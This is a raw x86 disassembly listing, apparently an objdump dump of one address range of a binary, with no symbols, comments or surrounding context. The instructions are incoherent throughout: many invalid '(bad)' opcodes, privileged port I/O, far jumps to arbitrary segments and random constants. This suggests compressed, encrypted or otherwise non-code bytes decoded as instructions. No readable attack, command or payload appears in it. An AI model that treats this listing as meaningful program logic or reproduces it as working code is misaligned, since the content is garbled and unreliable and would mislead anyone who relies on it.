  41f48b:	cmp    esp,DWORD PTR [edi-0x202fea4]
  41f491:	cmc    
  41f492:	jae    0x41f423
  41f494:	add    ch,cl
  41f496:	xlat   BYTE PTR ds:[ebx]
  41f497:	lds    edx,FWORD PTR [edi+0x64]
  41f49a:	mov    ebx,0xc1330f73
  41f49f:	ds call 0xc3e156ce
  41f4a5:	inc    eax
  41f4a6:	popa   
  41f4a7:	loop   0x41f4cc
  41f4a9:	lds    ecx,FWORD PTR [edi-0x56]
  41f4ac:	arpl   WORD PTR [ebx+0x7e],dx
  41f4af:	jae    0x41f4b3
  41f4b1:	inc    ecx
  41f4b2:	stos   BYTE PTR es:[edi],al
  41f4b3:	and    eax,0x1730285e
  41f4b8:	das    
  41f4b9:	lods   eax,DWORD PTR ds:[esi]
  41f4ba:	out    0x69,al
  41f4bc:	lods   eax,DWORD PTR ds:[esi]
  41f4bd:	fcmovu st,st(1)
  41f4bf:	and    al,0xce
  41f4c1:	mov    edx,0x58b9060c
  41f4c6:	add    ah,ch
  41f4c8:	ss pop ds
  41f4ca:	aad    0x62
  41f4cc:	in     eax,0x34
  41f4ce:	stc    
  41f4cf:	cmc    
  41f4d0:	jnp    0x41f4a7
  41f4d2:	int    0x67
  41f4d4:	enter  0x9dc4,0x53
  41f4d8:	xor    bh,ah
  41f4da:	fmul   QWORD PTR [eax+eiz*2]
  41f4dd:	add    DWORD PTR [edx+0x42a3b19f],0xd99bbc30
  41f4e7:	mov    cl,0x1f
  41f4e9:	mov    BYTE PTR [ebx+ebx*2],dl
  41f4ec:	retf   
  41f4ed:	dec    esp
  41f4ee:	sar    ebx,1
  41f4f0:	pop    ds
  41f4f1:	stc    
  41f4f2:	std    
  41f4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4f4:	push   ecx
  41f4f5:	jle    0x41f524
  41f4f7:	or     al,0xad
  41f4f9:	mov    eax,ds:0xe407b12d
  41f4fe:	ins    DWORD PTR es:[edi],dx
  41f4ff:	lds    esi,FWORD PTR [edx-0x6af24785]
  41f505:	mov    dl,ch
  41f507:	or     al,0xa1
  41f509:	xchg   edi,eax
  41f50a:	jo     0x41f526
  41f50c:	mov    ebp,0x5e9e0d09
  41f511:	mov    ds:0x446a4f6f,al
  41f516:	mov    ?,WORD PTR [ebp+0x57]
  41f519:	and    BYTE PTR [ecx],0xee
  41f51c:	aas    
  41f51d:	jle    0x41f501
  41f51f:	pop    esp
  41f520:	jg     0x41f4c3
  41f522:	and    eax,0x177dec09
  41f527:	ss dec ebp
  41f529:	(bad)
  41f52c:	push   0xffffffb2
  41f52e:	mov    al,0xd3
  41f530:	adc    al,0x3d
  41f532:	test   BYTE PTR [ebx-0x460ae159],ah
  41f538:	mov    dh,0x22
  41f53a:	repz mov ah,0x46
  41f53d:	jg     0x41f5a0
  41f53f:	fwait
  41f540:	xchg   edx,eax
  41f541:	jbe    0x41f5b3
  41f543:	call   0xccd36fc0
  41f548:	jb     0xa58a5664
  41f54e:	mov    bh,0x1c
  41f550:	xor    al,0xe9
  41f552:	push   ebx
  41f553:	inc    edx
  41f554:	push   ebx
  41f555:	mov    WORD PTR [esi-0x5dcc2565],gs
  41f55b:	add    al,0x90
  41f55e:	cmp    ah,BYTE PTR [ebx]
  41f560:	out    0xdd,eax
  41f562:	jg     0x41f5d0
  41f564:	shl    BYTE PTR [edx+0x68],cl
  41f567:	inc    ecx
  41f568:	or     al,0x79
  41f56a:	bound  esp,QWORD PTR [edi-0x38]
  41f56d:	mov    ds:0xad742096,al
  41f572:	adc    eax,0xcc1cd486
  41f577:	test   BYTE PTR [edi+0x647f540e],ah
  41f57d:	sbb    DWORD PTR [ebp+0x4758f729],ebx
  41f583:	test   DWORD PTR [edx],ecx
  41f585:	test   al,0x68
  41f587:	inc    ebx
  41f588:	iret   
  41f589:	inc    ecx
  41f58a:	repnz mov al,ds:0x66978184
  41f590:	rcl    esp,1
  41f592:	inc    ebx
  41f593:	neg    BYTE PTR [edi+0x33f987ff]
  41f599:	(bad)  
  41f59b:	in     eax,dx
  41f59c:	add    DWORD PTR [ecx],ecx
  41f59e:	and    dl,BYTE PTR [ebp-0x2e9158f1]
  41f5a4:	pop    edx
  41f5a5:	add    al,0xe8
  41f5a7:	mov    esp,0xf386444a
  41f5ac:	xor    BYTE PTR [edi-0x4a8a2d0],bl
  41f5b2:	test   DWORD PTR [ebp-0x3ac39795],0x5ed561f9
  41f5bc:	retf   0x2445
  41f5bf:	int    0xa6
  41f5c1:	arpl   WORD PTR [edx+ebx*4+0x44],bp
  41f5c5:	scas   eax,DWORD PTR es:[edi]
  41f5c6:	(bad)  
  41f5c7:	mov    cl,0x4b
  41f5c9:	repnz out 0x69,al
  41f5cc:	test   eax,0x1edbdad9
  41f5d1:	xchg   ecx,eax
  41f5d2:	ins    BYTE PTR es:[edi],dx
  41f5d3:	stos   BYTE PTR es:[edi],al
  41f5d4:	mov    dl,0xf4
  41f5d6:	and    ebp,DWORD PTR [edx-0x4183ff98]
  41f5dc:	jb     0x41f638
  41f5de:	inc    esp
  41f5df:	jle    0x41f574
  41f5e1:	cmp    ecx,DWORD PTR [eax]
  41f5e3:	or     eax,0x35f3622c
  41f5e8:	aas    
  41f5e9:	push   esp
  41f5ea:	xchg   edx,eax
  41f5eb:	push   edi
  41f5ec:	fistp  QWORD PTR [esi]
  41f5ee:	loopne 0x41f5f6
  41f5f0:	stos   BYTE PTR es:[edi],al
  41f5f1:	enter  0x88c0,0xbc
  41f5f5:	out    dx,eax
  41f5f6:	cmc    
  41f5f7:	retf   0x8e00
  41f5fa:	test   DWORD PTR [ecx-0x5c],esi
  41f5fd:	mov    dl,0x10
  41f5ff:	inc    edi
  41f600:	inc    eax
  41f601:	xchg   ebp,eax
  41f602:	sbb    eax,0x473b1c70
  41f607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f608:	dec    ebx
  41f609:	fist   DWORD PTR [ecx+0x29]
  41f60c:	mov    ebx,0xf5d8b88c
  41f611:	setns  BYTE PTR [esi+0x28ef0512]
  41f618:	test   eax,0xaaba4191
  41f61d:	adc    al,0xd6
  41f61f:	jo     0x41f5a1
  41f621:	xor    DWORD PTR [ebp+edi*2+0x7e],0xcd089b26
  41f629:	jnp    0x41f5cf
  41f62b:	lods   eax,DWORD PTR ds:[esi]
  41f62c:	fs inc ebp
  41f62e:	aaa    
  41f62f:	sbb    eax,0x7a27f184
  41f634:	jnp    0x41f5c7
  41f636:	xor    dl,BYTE PTR [esi-0x1618123c]
  41f63c:	xchg   esp,eax
  41f63d:	clc    
  41f63e:	popf   
  41f63f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f640:	test   al,0x4f
  41f642:	ror    bl,0x7b
  41f645:	jne    0x41f694
  41f647:	xor    DWORD PTR [ebx-0x79],ebx
  41f64a:	out    dx,al
  41f64b:	daa    
  41f64c:	cmp    al,0x7d
  41f64e:	pop    esp
  41f64f:	imul   esp,DWORD PTR [edx-0x56797779],0x3e
  41f656:	push   0x8987f64
  41f65b:	pop    edi
  41f65c:	sar    BYTE PTR [esi+0x40724ccd],0xab
  41f663:	popa   
  41f664:	mov    eax,ds:0xc8eeaeda
  41f669:	jecxz  0x41f66c
  41f66b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f66c:	sub    bl,BYTE PTR [edx]
  41f66e:	js     0x41f6dc
  41f670:	adc    BYTE PTR [edi-0x33],ch
  41f673:	mov    DWORD PTR [ebp-0x6e40e7ee],edx
  41f679:	adc    al,0x61
  41f67b:	popa   
  41f67c:	xor    al,0x91
  41f67e:	push   ds
  41f67f:	test   eax,0x9667be32
  41f684:	ins    DWORD PTR es:[edi],dx
  41f685:	jge    0x41f6be
  41f687:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f688:	xchg   ebp,eax
  41f689:	mov    ah,0xe0
  41f68b:	dec    edi
  41f68c:	loopne 0x41f67d
  41f68e:	call   0xbf3c:0x663945e4
  41f695:	adc    eax,eax
  41f697:	inc    edx
  41f698:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f699:	pop    edi
  41f69a:	cmp    DWORD PTR [esi],esi
  41f69c:	scas   eax,DWORD PTR es:[edi]
  41f69d:	loope  0x41f63a
  41f69f:	stos   DWORD PTR es:[edi],eax
  41f6a0:	shr    BYTE PTR [ecx+0x4a],cl
  41f6a3:	add    edi,0xffffffef
  41f6a6:	ret    
  41f6a7:	pop    ss
  41f6a8:	jle    0x41f694
  41f6aa:	fdivr  DWORD PTR [eax]
  41f6ac:	fisttp QWORD PTR gs:[ebx]
  41f6af:	ds out dx,al
  41f6b1:	jecxz  0x41f6f3
  41f6b3:	addr16 imul ebp,ecx,0xe2688100
  41f6ba:	ss sbb esp,eax
  41f6bd:	push   ebx
  41f6be:	sbb    BYTE PTR [edi+0x17dccdd6],bl
  41f6c4:	mov    edi,0x2ef432ec
  41f6c9:	sti    
  41f6ca:	mov    DWORD PTR ds:0xb4478f83,ebp
  41f6d0:	lahf   
  41f6d1:	xchg   edx,eax
  41f6d2:	mov    ebx,0xa2142d6
  41f6d7:	ror    BYTE PTR [ebp-0x7e],cl
  41f6da:	pop    edi
  41f6db:	cmp    DWORD PTR [edx],eax
  41f6dd:	jmp    0x972ecfea
  41f6e2:	push   edx
  41f6e3:	arpl   WORD PTR [ebx],cx
  41f6e5:	pusha  
  41f6e6:	fwait
  41f6e7:	inc    ecx
  41f6e8:	or     dh,dh
  41f6ea:	pop    ss
  41f6eb:	xor    ebp,esp
  41f6ed:	(bad)  
  41f6ef:	sti    
  41f6f0:	jno    0x41f70f
  41f6f2:	cwde   
  41f6f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6f4:	sahf   
  41f6f5:	out    0x87,al
  41f6f7:	pop    es
  41f6f8:	mov    edi,0xadc8f42b
  41f6fd:	loope  0x41f6b4
  41f6ff:	loop   0x41f6c4
  41f701:	sub    eax,0xc2a8147f
  41f706:	scas   al,BYTE PTR es:[edi]
  41f707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f708:	neg    esp
  41f70a:	rcl    DWORD PTR [edi-0x62e43f81],0x87
  41f711:	fistp  DWORD PTR [eax+ebp*1-0x46]
  41f715:	xor    ebx,ebx
  41f717:	jno    0x41f6c8
  41f719:	hlt    
  41f71a:	fcmovne st,st(6)
  41f71c:	stos   DWORD PTR es:[edi],eax
  41f71d:	sti    
  41f71e:	out    dx,al
  41f71f:	sub    al,0xf9
  41f721:	inc    edx
  41f722:	cs popf 
  41f724:	mov    dl,0xa4
  41f726:	aam    0xb6
  41f728:	and    BYTE PTR [edx],cl
  41f72a:	or     bh,0xfb
  41f72d:	sub    DWORD PTR [esi+0x655396cd],eax
  41f733:	cmp    ecx,ecx
  41f735:	fwait
  41f736:	xchg   edi,eax
  41f737:	call   0x4e5e671c
  41f73c:	jecxz  0x41f6dd
  41f73e:	adc    bl,ah
  41f740:	inc    edi
  41f741:	jecxz  0x41f6d3
  41f743:	loope  0x41f6e1
  41f745:	jl     0x41f711
  41f747:	lahf   
  41f748:	lods   eax,DWORD PTR ds:[esi]
  41f749:	shl    BYTE PTR [ecx],0x16
  41f74c:	and    BYTE PTR [edi+edx*8-0xc],bh
  41f750:	mov    ds:0x5c6e7629,eax
  41f755:	nop
  41f756:	test   BYTE PTR [esi],dl
  41f758:	int3   
  41f759:	out    0xd3,eax
  41f75b:	imul   ecx,DWORD PTR [ecx],0x1ee27579
  41f761:	push   ebp
  41f762:	sbb    ecx,DWORD PTR [ecx+0x32e1dc3c]
  41f768:	sbb    al,0x9d
  41f76a:	mov    esp,0x4d87f116
  41f76f:	test   al,0x7
  41f771:	(bad)  
  41f772:	mov    al,ds:0xc7922d3a
  41f777:	test   al,0xb3
  41f779:	pop    edx
  41f77a:	gs pop esi
  41f77c:	jle    0x41f72c
  41f77e:	jae    0x41f706
  41f780:	xchg   esp,eax
  41f781:	sbb    eax,0x93589bd7
  41f786:	pop    edx
  41f787:	xor    eax,0x8c147b8b
  41f78c:	adc    al,0xa8
  41f78e:	(bad)  
  41f78f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f790:	xchg   ebx,eax
  41f791:	xor    BYTE PTR [edi-0x31308e72],ah
  41f797:	aaa    
  41f798:	sti    
  41f799:	sbb    ebp,eax
  41f79b:	repz ds rcr DWORD PTR ds:[ecx+ecx*8-0x75],0x73
  41f7a3:	jmp    0xb10e:0x41d4f1f5
  41f7aa:	sub    ebx,esp
  41f7ac:	push   ss
  41f7ad:	and    ebp,ebp
  41f7af:	adc    al,0x2f
  41f7b1:	jae    0x41f736
  41f7b3:	daa    
  41f7b4:	mov    bh,ah
  41f7b6:	cli    
  41f7b7:	ins    DWORD PTR es:[edi],dx
  41f7b8:	ins    BYTE PTR es:[edi],dx
  41f7b9:	and    bl,BYTE PTR [ebx]
  41f7bb:	aam    0xf1
  41f7bd:	int    0xbc
  41f7bf:	fisttp WORD PTR [edi-0x46]
  41f7c2:	js     0x41f7ed
  41f7c4:	aam    0xe4
  41f7c6:	mov    fs,WORD PTR [ebp-0x4eb7b01f]
  41f7cc:	sbb    edx,DWORD PTR [esi]
  41f7ce:	mov    ah,0x2b
  41f7d0:	jp     0x41f7a3
  41f7d2:	dec    esp
  41f7d3:	cmp    ah,bl
  41f7d5:	popf   
  41f7d6:	pop    ebx
  41f7d7:	ins    DWORD PTR es:[edi],dx
  41f7d8:	(bad)
  41f7db:	mov    al,0x76
  41f7dd:	add    dl,dl
  41f7df:	mov    ah,0x33
  41f7e1:	xchg   edx,eax
  41f7e2:	fimul  DWORD PTR [ebx+0x461d7d36]
  41f7e8:	pop    es
  41f7e9:	inc    esp
  41f7ea:	adc    DWORD PTR [eax-0x1d],edi
  41f7ed:	scas   al,BYTE PTR es:[edi]
  41f7ee:	jecxz  0x41f7cd
  41f7f0:	xor    BYTE PTR [edi+0x667820a4],0x3
  41f7f7:	aaa    
  41f7f8:	or     DWORD PTR [esi+0x5f],ebx
  41f7fb:	mov    dh,0x8c
  41f7fd:	fst    DWORD PTR [ebx]
  41f7ff:	push   es
  41f800:	loop   0x41f811
  41f802:	mov    esi,0x5e303ae
  41f807:	or     esi,esp
  41f809:	test   eax,0xeb7018aa
  41f80e:	scas   eax,DWORD PTR es:[edi]
  41f80f:	jb     0x41f814
  41f811:	push   ds
  41f812:	lahf   
  41f813:	add    bl,BYTE PTR [edi]
  41f815:	sbb    ecx,0x2c
  41f818:	xchg   esi,eax
  41f819:	jb     0x41f7fb
  41f81b:	fstp   st(4)
  41f81d:	imul   ecx,DWORD PTR [edx+edx*4],0xbd10b87e
  41f824:	mov    eax,ds:0x870589fe
  41f829:	cmp    al,0x89
  41f82b:	xor    eax,DWORD PTR [edx]
  41f82d:	dec    esi
  41f82e:	xchg   edi,eax
  41f82f:	sub    DWORD PTR [edi+0xe],esi
  41f832:	mov    WORD PTR [esi-0x301d7aa8],?
  41f838:	fimul  DWORD PTR [esi-0x4df73392]
  41f83e:	test   eax,0x72f959da
  41f843:	cmp    esi,DWORD PTR [esi]
  41f845:	pop    eax
  41f846:	xchg   dh,ch
  41f848:	das    
  41f849:	mov    edi,0xc9920a8d
  41f84e:	int3   
  41f84f:	adc    edx,DWORD PTR [edi+0x42]
  41f852:	aas    
  41f853:	imul   esi,ebx,0xd28a322
  41f859:	sahf   
  41f85a:	cmp    eax,0x993e9f58
  41f85f:	repz dec ebx
  41f861:	mov    eax,0x5f5e63e2
  41f866:	xchg   ebx,esp
  41f868:	out    0x37,eax
  41f86a:	in     al,dx
  41f86b:	xchg   ebp,eax
  41f86c:	sub    DWORD PTR [edi-0x7f9affae],0x26bd7c52
  41f876:	hlt    
  41f877:	rep outs dx,BYTE PTR ds:[esi]
  41f879:	in     al,dx
  41f87a:	cli    
  41f87b:	jg     0x41f88d
  41f87d:	or     ah,BYTE PTR [ecx+0x65ae49e5]
  41f883:	mov    bl,0x42
  41f885:	push   esi
  41f886:	sub    edi,DWORD PTR [edi]
  41f888:	inc    edx
  41f889:	sub    BYTE PTR [ecx-0x24ba1e05],bh
  41f88f:	outs   dx,BYTE PTR ds:[esi]
  41f890:	jne    0x41f8e7
  41f892:	sar    BYTE PTR [eax+0x1df0add3],cl
  41f898:	(bad)  
  41f899:	push   ss
  41f89a:	inc    esp
  41f89b:	and    ch,BYTE PTR [ebp-0xf4680af]
  41f8a1:	ds out dx,eax
  41f8a3:	push   cs
  41f8a4:	cmp    DWORD PTR [edi+eiz*8],0xfffffffe
  41f8a8:	and    ah,dh
  41f8aa:	aad    0x3e
  41f8ac:	cmp    al,0x6d
  41f8ae:	or     dh,cl
  41f8b0:	(bad)
  41f8b3:	pop    es
  41f8b4:	dec    eax
  41f8b5:	nop
  41f8b6:	sbb    al,0xa
  41f8b8:	enter  0xc513,0xf5
  41f8bc:	xor    eax,0xcdc03796
  41f8c1:	retf   0x5c77
  41f8c4:	sbb    al,0xc0
  41f8c6:	mov    ds:0x373901a8,eax
  41f8cb:	push   ecx
  41f8cc:	mov    bl,al
  41f8ce:	and    al,0xfb
  41f8d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8d1:	push   ds
  41f8d2:	push   ebx
  41f8d3:	frstpm(287 only) 
  41f8d5:	jl     0x41f8c6
  41f8d7:	addr16 sub al,0x9b
  41f8da:	outs   dx,BYTE PTR ds:[esi]
  41f8db:	or     al,0x8f
  41f8dd:	push   esp
  41f8de:	outs   dx,BYTE PTR ds:[esi]
  41f8df:	scas   eax,DWORD PTR es:[edi]
  41f8e0:	repnz mov cl,0x7f
  41f8e3:	mov    ds:0x112ef688,al
  41f8e8:	xor    DWORD PTR [ecx],edx
  41f8ea:	push   0xffffffbb
  41f8ec:	ret    
  41f8ed:	mov    dh,0x49
  41f8ef:	pop    esi
  41f8f0:	mov    BYTE PTR [edi],al
  41f8f2:	jge    0x41f964
  41f8f4:	pusha  
  41f8f5:	mov    al,ds:0x8f9fce00
  41f8fa:	inc    ebp
  41f8fb:	and    bh,BYTE PTR [ebx]
  41f8fd:	je     0x41f911
  41f8ff:	les    esi,FWORD PTR [edx+edx*8]
  41f902:	pop    eax
  41f903:	pop    esp
  41f904:	pop    ss
  41f905:	sti    
  41f906:	icebp  
  41f907:	aaa    
  41f908:	gs jmp 0xddd2:0x4af0f711
  41f910:	pushf  
  41f911:	mov    eax,0x8a917ce2
  41f916:	lfs    ecx,FWORD PTR [edi+ebx*1+0x42]
  41f91b:	push   edx
  41f91c:	out    0xd9,al
  41f91e:	mov    ecx,0xb3926eba
  41f923:	jle    0x41f90a
  41f925:	outs   dx,DWORD PTR ds:[esi]
  41f926:	or     DWORD PTR [eax+0x70],esp
  41f929:	daa    
  41f92a:	inc    ebx
  41f92b:	ficomp WORD PTR [edx]
  41f92d:	in     al,0x98
  41f92f:	(bad)  
  41f930:	mov    eax,0x31639b0e
  41f935:	sub    al,0xba
  41f937:	and    eax,DWORD PTR [ebp+0x207c7e70]
  41f93d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f93e:	mov    gs,eax
  41f940:	mov    cl,0x66
  41f942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f943:	pop    es
  41f944:	inc    ebp
  41f945:	pop    ecx
  41f946:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f947:	jmp    0x41f8f3
  41f949:	aam    0x6a
  41f94b:	fldenv [edx]
  41f94d:	and    DWORD PTR [ebx],0xffffffa5
  41f950:	push   es
  41f951:	mov    ds:0xa98fcc85,eax
  41f956:	adc    BYTE PTR [ebp+eax*8+0x5d8a383a],ch
  41f95d:	(bad)  
  41f95e:	inc    BYTE PTR [ebp-0x3]
  41f961:	rcr    esi,0xf3
  41f964:	sub    esp,DWORD PTR [ebx]
  41f966:	stc    
  41f967:	stc    
  41f968:	fnstenv [ebx]
  41f96a:	addr16 loop 0x41f969
  41f96d:	aaa    
  41f96e:	xchg   BYTE PTR [edi+0x21b39cb7],ah
  41f974:	ja     0x41f935
  41f976:	in     eax,dx
  41f977:	xor    BYTE PTR [ebx-0x67a4c22b],bl
  41f97d:	and    eax,0x6e5fc8ad
  41f982:	jno    0x41f95a
  41f984:	std    
  41f985:	vxorps ymm3,ymm0,ymm3
  41f989:	cmp    BYTE PTR ds:0xb27dfe29,ah
  41f98f:	lahf   
  41f990:	jae    0x41f9c5
  41f992:	dec    eax
  41f993:	jns    0x41f963
  41f995:	cmp    bh,ah
  41f997:	or     bl,BYTE PTR [esi]
  41f999:	jno    0x41f9e5
  41f99b:	adc    BYTE PTR [ecx],al
  41f99d:	test   BYTE PTR [edi+0x7ebbd51e],dl
  41f9a3:	(bad)  
  41f9a4:	fimul  DWORD PTR [eax]
  41f9a6:	sbb    al,BYTE PTR fs:[ecx]
  41f9a9:	jl     0x41f947
  41f9ab:	aad    0xc5
  41f9ad:	sbb    ebx,DWORD PTR [eax+ebp*1]
  41f9b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9b1:	adc    al,al
  41f9b3:	cmp    BYTE PTR ds:0x6a914860,ah
  41f9b9:	addr16 lock mov ds:0x4a9d,al
  41f9be:	hlt    
  41f9bf:	mov    dl,ch
  41f9c1:	jle    0x41f9b0
  41f9c3:	js     0x41f9a8
  41f9c5:	bound  edi,QWORD PTR [eax]
  41f9c7:	xor    BYTE PTR [esi+0x1f803cbd],dh
  41f9cd:	in     eax,dx
  41f9ce:	adc    esp,DWORD PTR [esi+0x47]
  41f9d1:	mov    eax,0xee84a197
  41f9d6:	and    cl,bl
  41f9d8:	add    al,0xf6
  41f9da:	xchg   ebx,eax
  41f9db:	popa   
  41f9dc:	sub    al,0x47
  41f9de:	and    BYTE PTR [ecx-0x68635c5],dl
  41f9e4:	cmp    edx,0x58944757
  41f9ea:	xchg   edi,eax
  41f9eb:	jl     0x41fa57
  41f9ed:	rcr    BYTE PTR [ecx],cl
  41f9ef:	fistp  WORD PTR [eax+0x1dd7eadf]
  41f9f5:	jno    0x41f993
  41f9f7:	adc    BYTE PTR [esi+0x2a26a51c],ch
  41f9fd:	sbb    dl,bl
  41f9ff:	shr    BYTE PTR [ebp+0x797a8854],1
  41fa05:	dec    edi
  41fa06:	and    eax,0x2221c409
  41fa0b:	dec    edx
  41fa0c:	cmp    ecx,DWORD PTR [edx]
  41fa0e:	mov    esi,0xc9ebc465
  41fa13:	push   0xfffffff8
  41fa15:	das    
  41fa16:	jge    0x41fa15
  41fa18:	dec    BYTE PTR [edi]
  41fa1a:	lock aaa 
  41fa1c:	lods   eax,DWORD PTR ds:[esi]
  41fa1d:	fisttp WORD PTR [edi+0x6b]
  41fa20:	xor    DWORD PTR [edx],esp
  41fa22:	push   esp
  41fa23:	gs pop ss
  41fa25:	lock cbw 
  41fa28:	push   esp
  41fa29:	jo     0x41fa14
  41fa2b:	out    dx,al
  41fa2c:	in     al,dx
  41fa2d:	sub    eax,0xe6ed87d0
  41fa32:	nop
  41fa33:	loopne 0x41fa63
  41fa35:	arpl   WORD PTR [ecx],cx
  41fa37:	inc    cl
  41fa39:	jns    0x41fa69
  41fa3b:	or     bh,dh
  41fa3d:	daa    
  41fa3e:	ret    0x622a
  41fa41:	sbb    esp,eax
  41fa43:	mov    ds:0xe98d97c6,eax
  41fa48:	mov    dh,BYTE PTR [ecx-0x57]
  41fa4b:	mov    eax,db4
  41fa4e:	jmp    0x41fa5c
  41fa50:	ret    
  41fa51:	stos   DWORD PTR es:[edi],eax
  41fa52:	or     BYTE PTR [ecx],ch
  41fa54:	ins    BYTE PTR es:[edi],dx
  41fa55:	arpl   WORD PTR [edi+0x6a2b3e0b],dx
  41fa5b:	jg     0x41f9de
  41fa5d:	or     al,0x55
  41fa5f:	or     al,0x76
  41fa61:	jae    0x41fa62
  41fa63:	or     edx,DWORD PTR [edi]
  41fa65:	ret    0xb5be
  41fa68:	mov    ebx,0x91f0308d
  41fa6d:	into   
  41fa6e:	leave  
  41fa6f:	out    dx,al
  41fa70:	fucomi st,st(0)
  41fa72:	mov    ds:0xee3dee65,eax
  41fa77:	mov    esi,0xd0595df3
  41fa7c:	or     ah,al
  41fa7e:	mov    eax,0x909ba639
  41fa83:	test   BYTE PTR [edx],0x22
  41fa86:	pop    ecx
  41fa87:	dec    ebx
  41fa88:	xor    edx,0xaf157519
  41fa8e:	clc    
  41fa8f:	hlt    
  41fa90:	add    ah,BYTE PTR [edi]
  41fa92:	retf   
  41fa93:	call   0xcd0d:0x86efb5bd
  41fa9a:	bound  esi,QWORD PTR ds:0x4b7a3078
  41faa0:	xchg   esi,eax
  41faa1:	les    ebx,FWORD PTR [ebp+eiz*1+0x48]
  41faa5:	shr    edi,cl
  41faa7:	test   al,0x6b
  41faa9:	xchg   edi,eax
  41faaa:	sti    
  41faab:	enter  0x28b,0x5
  41faaf:	xchg   edi,eax
  41fab0:	mov    ch,BYTE PTR [edx]
  41fab2:	or     cl,0xc5
  41fab5:	fisubr WORD PTR ds:[edi+ebx*4+0x262ba35e]
  41fabd:	retf   0x534d
  41fac0:	inc    eax
  41fac1:	or     eax,0x60d650f9
  41fac6:	sbb    al,0x1b
  41fac8:	aam    0x75
  41faca:	cvtps2pi mm2,QWORD PTR [edi+0x12]
  41face:	add    edx,DWORD PTR ds:0xc2d04538
  41fad4:	sbb    edi,DWORD PTR [ecx-0x4c]
  41fad7:	cmp    BYTE PTR [ecx-0x4a191454],ch
  41fadd:	xor    edx,ebp
  41fadf:	adc    DWORD PTR [edi],edi
  41fae1:	lods   al,BYTE PTR ds:[esi]
  41fae2:	jg     0x41fadd
  41fae4:	outs   dx,BYTE PTR ds:[esi]
  41fae5:	xor    edi,DWORD PTR [ecx+0x7f]
  41fae8:	xor    cl,dl
  41faea:	sbb    al,BYTE PTR [ecx+ebp*8+0x53]
  41faee:	ins    BYTE PTR es:[edi],dx
  41faef:	xchg   ebx,eax
  41faf0:	and    ecx,edi
  41faf2:	xor    dl,BYTE PTR [edi+0x4f]
  41faf5:	loopne 0x41facd
  41faf7:	adc    bl,BYTE PTR [ebp-0x49]
  41fafa:	jns    0x41fae8
  41fafc:	cdq    
  41fafd:	xchg   ebx,eax
  41fafe:	mov    edx,0x772dd6c4
  41fb03:	push   esp
  41fb04:	scas   al,BYTE PTR es:[edi]
  41fb05:	push   0x44b2cba4
  41fb0a:	jo     0x41fadc
  41fb0c:	sbb    DWORD PTR [ebx*8-0x2f12ce8f],0xa052c533
  41fb17:	xor    BYTE PTR [esi+0x2e],ch
  41fb1a:	shr    DWORD PTR [eax],0x4a
  41fb1d:	pop    ebp
  41fb1e:	sub    bh,ch
  41fb20:	in     al,dx
  41fb21:	in     al,0x4e
  41fb23:	fst    st(4)
  41fb25:	(bad)  
  41fb26:	sbb    BYTE PTR [ebx+0x539167],bh
  41fb2c:	jp     0x41fb37
  41fb2e:	xchg   edi,eax
  41fb2f:	add    al,0x1e
  41fb31:	icebp  
  41fb32:	test   BYTE PTR fs:[ecx],ah
  41fb35:	shl    BYTE PTR [esi+0x1b],1
  41fb38:	adc    al,BYTE PTR [esi]
  41fb3a:	mov    esp,0xecd51ebb
  41fb3f:	lods   eax,DWORD PTR ds:[esi]
  41fb40:	add    al,0xc8
  41fb42:	xor    ebp,DWORD PTR [ecx]
  41fb44:	ins    DWORD PTR es:[edi],dx
  41fb45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb46:	mov    ds:0x9c87d67c,eax
  41fb4b:	repnz mov cl,0xe
  41fb4e:	adc    bh,BYTE PTR [edi-0x69c3740c]
  41fb54:	mov    DWORD PTR [edx],0x8209049d
  41fb5a:	jae    0x41fb56
  41fb5c:	mov    cl,0x6b
  41fb5e:	data16 fbstp TBYTE PTR [ebp+0x41]
  41fb62:	fwait
  41fb63:	xchg   ebp,eax
  41fb64:	ds jge 0x41fb1f
  41fb67:	fnstenv [esi]
  41fb69:	adc    al,0xeb
  41fb6b:	repnz test BYTE PTR [esi],al
  41fb6e:	data16 adc dh,BYTE PTR [esi+0x13b45b92]
  41fb75:	inc    edx
  41fb76:	mov    ah,0x7
  41fb78:	(bad)  
  41fb79:	xor    eax,0x2d19b110
  41fb7e:	fwait
  41fb7f:	lods   eax,DWORD PTR ds:[esi]
  41fb80:	push   esp
  41fb81:	xchg   DWORD PTR [ecx+0x46],ecx
  41fb84:	xor    esp,edx
  41fb86:	sbb    al,ah
  41fb88:	pop    ebp
  41fb89:	xlat   BYTE PTR ds:[ebx]
  41fb8a:	pop    esp
  41fb8b:	nop
  41fb8c:	or     bh,dh
  41fb8e:	jl     0x41fb6c
  41fb90:	enter  0xb949,0xac
  41fb94:	int3   
  41fb95:	js     0x41fb44
  41fb97:	repz add dh,BYTE PTR [eax-0x24fc605e]
  41fb9e:	mov    al,0x44
  41fba0:	lods   eax,DWORD PTR ds:[esi]
  41fba1:	pop    ecx
  41fba2:	mov    ss,WORD PTR [esi+0x3f]
  41fba5:	mov    esi,0x3203410b
  41fbaa:	dec    ecx
  41fbab:	into   
  41fbac:	sbb    ebp,DWORD PTR [esi+eiz*1]
  41fbaf:	sub    BYTE PTR [edx+ebx*8+0x4d81ba6e],0x69
  41fbb7:	bound  esp,QWORD PTR ds:0xa1ec6a6
  41fbbd:	pop    ecx
  41fbbe:	xchg   esi,eax
  41fbbf:	or     eax,DWORD PTR [esp+eax*8]
  41fbc2:	add    eax,0xef0a9ef5
  41fbc7:	jmp    0x41fb57
  41fbc9:	inc    ecx
  41fbca:	scas   al,BYTE PTR es:[edi]
  41fbcb:	out    0xe2,eax
  41fbcd:	or     BYTE PTR [esi-0x1cba3979],bh
